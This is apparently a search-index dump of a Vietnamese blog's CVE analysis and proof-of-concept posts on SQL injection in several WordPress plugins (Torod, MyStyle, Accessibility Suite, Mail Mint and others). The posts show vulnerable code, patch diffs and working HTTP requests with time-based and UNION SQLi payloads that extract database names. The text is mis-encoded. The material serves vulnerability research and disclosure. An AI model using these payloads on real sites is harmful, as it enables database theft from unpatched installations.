wxp_order_set_shipped trong th∆∞ m·ª•c ch·ª©a plugin. T√¨m v·ªã tr√≠ n∆°i h√†m wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi wxp_order_set_shipped ƒë∆∞·ª£c construct c·ªßa c√πng class s·ª≠ d·ª•ng l√†m callback cho hook wp_ajax_wxp_order_set_shipped =\u003e y√™u c·∫ßu ng∆∞·ªùi d√πng ph·∫£i ƒëƒÉng nh·∫≠p üëâ Khi truy c·∫≠p v√†o /wp-admin/admin-ajax.php v·ªõi tham s·ªë: action=wxp_order_set_shipped\u0026order_id=payload_here Callback wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi order_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi 2 l·∫ßn do ƒë∆∞·ª£c truy·ªÅn v√†o 2 h√†m ch·∫°y l·ªánh SQL v·ªõi payload ƒë·ªôc h·∫°i. Exploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh: SELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) ·ªû ƒë√¢y c√≥ 2 n∆°i th·ª±c hi·ªán query n√™n th·ªùi gian ph·∫£n h·ªìi s·∫Ω tƒÉng g·∫•p ƒë√¥i K·∫øt qu·∫£ ph·∫£n h·ªìi khi khai th√°c th√†nh c√¥ng Ta s·ª≠ d·ª•ng subquery trong m·ªánh ƒë·ªÅ FROM v√¨ truy v·∫•n con ƒë∆∞·ª£c coi nh∆∞ m·ªôt b·∫£ng t·∫°m th·ªùi. MySQL s·∫Ω th·ª±c thi truy ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Torod Plugin.","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Torod c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin. CVE ID: CVE-2025-30936 Product: WordPress Torod Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.9 Fixed in: \u003c= N/A CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Torod: v1.9 Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω. Vulnerable Sink CVE n√†y kh√¥ng c√≥ b·∫£n v√° n√™n kh√¥ng th·ªÉ s·ª≠ d·ª•ng diff tool ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa code l·ªói v√† code ƒë√£ fix l·ªói. Trong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong th∆∞ m·ª•c c·ªßa plugin ƒë·ªÉ t√¨m sink. T√¨m v·ªã tr√≠ sink trong code üëâ D·ªØ li·ªáu t·ª´ $_POST['country_id'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra. Source: $_POST['country_id'] Sink: $wpdb-\u003eget_results(\"SELECT * FROM $table_name WHERE country_id = $country_id\") How it work? L·ªó h·ªïng n·∫±m trong h√†m get_regions_and_cities c·ªßa class ajaxyk thu·ªôc file inc/ajaxyk.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_regions_and_cities trong th∆∞ m·ª•c ch·ª©a plugin. T√¨m v·ªã tr√≠ h√†m get_regions_and_cities üëâ get_regions_and_cities ƒë∆∞·ª£c construct c·ªßa class ajaxyk g·ªçi l√†m callback c·ªßa 2 action hook th√¥ng qua h√†m add_action wp_ajax_get_regions_and_cities ƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_{$action} Y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p wp_ajax_nopriv_get_regions_and_cities ƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_nopriv_{$action} Kh√¥ng y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p V√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated n√™n ta ch·ªâ quan t√¢m t·ªõi hook wp_ajax_nopriv_get_regions_and_cities. Nh∆∞ v·∫≠y khi g·ª≠i POST request ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi tham s·ªë action=wp_ajax_nopriv_get_regions_and_cities\u0026country_id=payload_here Callback get_regions_and_cities ƒë∆∞·ª£c g·ªçi. country_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi v·ªõi payload ƒë·ªôc h·∫°i. Exploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities\u0026country_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh: SELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a) K·∫øt qu·∫£ ph·∫£n h·ªìi th·ªùi gian üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u003e payload ho·∫°t ƒë·ªông. C√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng: UNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Th·ª© t·ª± th·ª±c thi truy v·∫•n SQL Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c. G·ª≠i request v·ªõi SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities=1\u0026country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(‚Äòw‚Äô) S·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ country_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field. üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u003e k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w. Conclusion L·ªó h·ªïng CVE-2025-30936 trong plugin Wor","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress MyStyle Custom Product Designer Plugin.","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng t·ªìn t·∫°i trong plugin MyStyle Custom Product Designer c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.21.2. L·ªó h·ªïng n√†y cho ph√©p k·∫ª t·∫•n c√¥ng t∆∞∆°ng t√°c tr·ª±c ti·∫øp v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh·∫£ nƒÉng tr√≠ch xu·∫•t ho·∫∑c thao t√∫ng d·ªØ li·ªáu. CVE ID: CVE-2025-48281 S·∫£n ph·∫©m: WordPress MyStyle Custom Product Designer Plugin Lo·∫°i l·ªó h·ªïng: SQL Injection Phi√™n b·∫£n b·ªã ·∫£nh h∆∞·ªüng: \u003c= 3.21.1 M·ª©c ƒë·ªô nghi√™m tr·ªçng (CVSS): Cao (9.3) Y√™u c·∫ßu ƒë·∫∑c quy·ªÅn: Kh√¥ng c·∫ßn x√°c th·ª±c Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. MyStyle Custom Product Designer: v3.21.1 (c√≥ l·ªó h·ªïng) v√† v3.21.2 (ƒë√£ v√°) C√¥ng c·ª• diff: meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh phi√™n b·∫£n n√†o WooCommerce plugin: ph·∫£i ƒë∆∞·ª£c k√≠ch ho·∫°t tr∆∞·ªõc khi c√†i ƒë·∫∑t MyStyle v√¨ plugin n√†y s·ª≠ d·ª•ng m·ªôt s·ªë h√†m t·ª´ WooCommerce Analysis Nguy√™n nh√¢n ch√≠nh l√† vi·ªác ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ tham s·ªë GET v√†o c√¢u truy v·∫•n SQL m√† kh√¥ng c√≥ bi·ªán ph√°p x√°c th·ª±c h·ª£p l·ªá. Patch Diff D∆∞·ªõi ƒë√¢y l√† s·ª± kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n (3.21.1 v√† 3.21.2) trong file includes/entities/class-mystyle-designmanager.php. So s√°nh b·∫£n v√° B·∫£n v√° m·ªõi ƒë√£ th√™m danh s√°ch whitelist $allowed_orderby ƒë·ªÉ ch·ªâ cho ph√©p s·∫Øp x·∫øp theo c√°c c·ªôt h·ª£p l·ªá. N·∫øu gi√° tr·ªã orderby kh√¥ng n·∫±m trong danh s√°ch, n√≥ s·∫Ω t·ª± ƒë·ªông b·ªã thay th·∫ø b·∫±ng 'ms_design_id', ngƒÉn ch·∫∑n ch√®n m√£ ƒë·ªôc SQL. How it works L·ªó h·ªïng n·∫±m trong h√†m get_designs thu·ªôc class MyStyle_DesignManager (file includes/entities/class-mystyle-designmanager.php). H√†m n√†y ƒë∆∞·ª£c g·ªçi b·ªüi c√°c h√†m nh∆∞ get_items, init_index_request, v√† m·ªôt s·ªë h√†m ki·ªÉm th·ª≠. K·∫øt qu·∫£ t√¨m ki·∫øm get_designs V√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated, c·∫ßn x√°c ƒë·ªãnh h√†m n√†o c√≥ th·ªÉ ƒë∆∞·ª£c g·ªçi m√† kh√¥ng y√™u c·∫ßu ƒëƒÉng nh·∫≠p. K·∫øt qu·∫£ cho th·∫•y ch·ªâ c√≥ init_index_request c√≥ th·ªÉ b·ªã khai th√°c tr·ª±c ti·∫øp qua URL /designs/. Lu·ªìng t·∫•n c√¥ng logic Exploit Ki·ªÉm tra SQLi G·ª≠i request ch·ª©a payload SQLi ƒë·ªÉ ki·ªÉm tra: GET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1 Host: localhost ... Cookie: cookie_here C√¢u truy v·∫•n k·∫øt qu·∫£: SELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0 N·∫øu ph·∫£n h·ªìi ch·∫≠m 5 gi√¢y ‚Üí payload ho·∫°t ƒë·ªông. Ki·ªÉm tra ƒë·ªô tr·ªÖ th·ªùi gian Kh√¥ng th√™m d·∫•u comment (--) sau SLEEP() v√¨ s·∫Ω khi·∫øn SQL parser l·ªói do xu·ªëng d√≤ng gi·ªØa ASC v√† OFFSET. Debug l·ªói L·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa t√™n c∆° s·ªü d·ªØ li·ªáu GET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1 Host: localhost ... Cookie: cookie_here N·∫øu ph·∫£n h·ªìi ch·∫≠m ‚Üí k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa t√™n database l√† w. K·ªπ thu·∫≠t n√†y c√≥ th·ªÉ ƒë∆∞·ª£c m·ªü r·ªông ƒë·ªÉ tr√≠ch xu·∫•t to√†n b·ªô t√™n c∆° s·ªü d·ªØ li·ªáu ho·∫∑c b·∫£ng d·ªØ li·ªáu. Conclusion L·ªó h·ªïng CVE-2025-48281 trong plugin MyStyle Custom Product Designer (\u003c= 3.21.1) xu·∫•t ph√°t t·ª´ vi·ªác ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu ng∆∞·ªùi d√πng v√†o truy v·∫•n SQL m√† kh√¥ng x√°c th·ª±c ƒë√∫ng c√°ch. B·∫£n v√° 3.21.2 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch √°p d·ª•ng danh s√°ch c·ªôt cho ph√©p (whitelist) v√† ki·ªÉm tra gi√° tr·ªã ƒë·∫ßu v√†o. B√†i h·ªçc r√∫t ra: Lu√¥n x√°c th·ª±c d·ªØ li·ªáu ƒë·∫ßu v√†o. Khi l√†m vi·ªác v·ªõi c∆° s·ªü d·ªØ li·ªáu trong WordPress, b·∫Øt bu·ªôc d√πng $wpdb-\u003eprepare(). Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection Cheat Sheet - PortSwigger WordPress MyStyle Custom Product Designer Plugin \u003c= 3.21.1 SQL Injection ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Accessibility Suite Plugin.","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Accessibility Suite c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.19. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin. CVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 4.18 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Accessibility Suite: v4.18(vul) v√† v4.19(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho input v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng prepare() ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i. Patch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/classes/Helper.php static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $list = json_decode( $wpdb-\u003eget_results($wpdb-\u003eprepare(\"SELECT list FROM $table_name WHERE scan_id = $scan_id\"))[0]-\u003elist // phpcs:ignore ); } B·∫£n v√° ƒë√£ truy·ªÅn $scan_id nh∆∞ tham s·ªë v√†o c√¢u query. SQL injection ƒë∆∞·ª£c ph√≤ng ng·ª´a v√¨ bi·∫øn kh√¥ng ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o query n·ªØa. static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\"status\" =\u003e \"failed\", \"msg\" =\u003e \"Invalid scan ID\"]; } // Get list using properly prepared query $query = $wpdb-\u003eprepare( \"SELECT list FROM %i WHERE scan_id = %d\", $table_name, $scan_id ); $result = $wpdb-\u003eget_results($query); } Patch diff How it work? L·ªó h·ªïng n·∫±m trong h√†m tƒ©nh save_false_positive c·ªßa class Helper thu·ªôc file includes/classes/Helper.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a save_false_positive trong th∆∞ m·ª•c ch·ª©a plugin. Search save_false_positive üëâ save_false_positive ƒë∆∞·ª£c callback c·ªßa action hook wp_ajax_ONLINE_ADAv4/save_false_positive g·ªçi. Khi POST request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi action=ONLINE_ADAv4/save_false_positive callback ƒë∆∞·ª£c g·ªçi. Trong request c·∫ßn 2 POST param issue_id v√† scan_id. N·∫øu kh√¥ng, ·ª©ng d·ª•ng s·∫Ω tr·∫£ v·ªÅ: save_false_positive ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë issue_id v√† scan_id. C√°c ƒë·ªëi s·ªë n√†y s·∫Ω b·ªã escape b·ªüi magic quotes trong WordPress v√¨ l·∫•y tr·ª±c ti·∫øp t·ª´ POST request. ·ª®ng d·ª•ng check xem ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin kh√¥ng. N·∫øu kh√¥ng, tr·∫£ v·ªÅ chu·ªói r·ªóng. if(! is_admin()) { return ''; } Sau ƒë√≥ c√°c ƒë·ªëi s·ªë tr·ª±c ti·∫øp truy·ªÅn v√†o c√¢u query ch·ª©a l·ªó h·ªïng SQLi r·ªìi th·ª±c thi. Exploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi. V√¨ ch·ªâ c·∫ßn l√† user c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin, n√™n ta t·∫°o user v·ªõi role:subcriber c√≥ privilege th·∫•p nh·∫•t. Trong WordPress, user c√≥ role cao h∆°n s·∫Ω k·∫ø th·ª´a c·∫£ privilege role th·∫•p h∆°n. N√™n ch·ªâ c·∫ßn user subcriber g·ª≠i payload th√†nh c√¥ng th√¨ t·∫•t c·∫£ user c√≤n l·∫°i ƒë·ªÅu c√≥ th·ªÉ. ƒê√∫ng v·ªõi m√¥ t·∫£ c·ªßa CVE POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026issue_id=1\u0026scan_id=1 UNION SELECT SLEEP(5) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh SELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) Time response with SQLi payload üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u003e payload ho·∫°t ƒë·ªông. C√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng: UNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng v·ªõi truy v·∫•n tr∆∞·ªõc ƒë√≥. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c t","date":"2025-09-26","objectID":"/vi/posts/2025-09-26-cve-2025-32650/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/vi/posts/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Mail Mint Plugin.","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Mail Mint c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.18.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin. CVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.18.5 CVSS severity: Low (7.6) Required Privilege: Administrator Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Mail Mint: v1.18.5(vul) v√† v1.18.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra. Patch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file /app/Utilities/Helper/Import.php public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"')\"; $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \"SELECT user_id FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"') GROUP BY user_id LIMIT $number OFFSET $offset\"; $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } B·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u003eprepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query. public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u003eprepare( \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders)\", $keys ); $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026 OFFSET (safe with prepare) $final_query = $wpdb-\u003eprepare( \"SELECT user_id FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\", array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } Patch Diff How it work? L·ªó h·ªïng n·∫±m trong h√†m get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) c·ªßa class Import. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a get_wp_users_by_learndash_with_limit_offset trong th∆∞ m·ª•c ch·ª©a plugin. Search Import K·∫øt qu·∫£ cho th·∫•y h√†m n√†y ƒë∆∞·ª£c g·ªçi trong: retrieve_contacts_associated_with_learndash() perform_learndash_user_import() thu·ªôc class ContactImportAction trong file /app/API/Actions/Admin/Contact/ContactImportAction.php. Ti·∫øp theo, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i retrieve_contacts_associated_with_learndash() ƒë∆∞·ª£c s·ª≠ d·ª•ng, ta t√¨m ki·∫øm t·ª´ kh√≥a retrieve_contacts_associated_with_learndash trong th∆∞ m·ª•c plugin. Search 1 H√†m n√†y ƒë∆∞·ª£c g·ªçi trong map_contacts_with_learndash() thu·ªôc class ContactImportController trong file /app/API/Controllers/Admin/Contact/ContactImportController.php. Ti·∫øp t·ª•c t√¨m ki·∫øm t·ª´ kh√≥a map_contacts_with_learndash ƒë·ªÉ xem h√†m n√†y ƒë∆∞·ª£c ƒëƒÉng k√Ω ·ªü ƒë√¢u: Search 2 Ta ph√°t hi·ªán r·∫±ng n√≥ ƒë∆∞·ª£c d√πng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress: class ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u003enamespace, // mrm/v1 $this-\u003erest_base . '/learndash/map', // contacts/import/learndash/map/ array( array( 'methods' =\u003e WP_REST_Server::CREATABLE, // POST 'callback' =\u003e array( $this-\u003econtroller, 'map_contacts_with_learndash' ), 'permission_callback' =\u003e PermissionManager::current_user_can('mint_manage_contacts'), // Admin 'args' =\u003e array( 'selectedCourses' =\u003e array( 'description' =\u003e __( 'The selected courses from which to import contacts.', 'mrm' ), 'required' =\u003e true, 'type' =\u003e 'array', 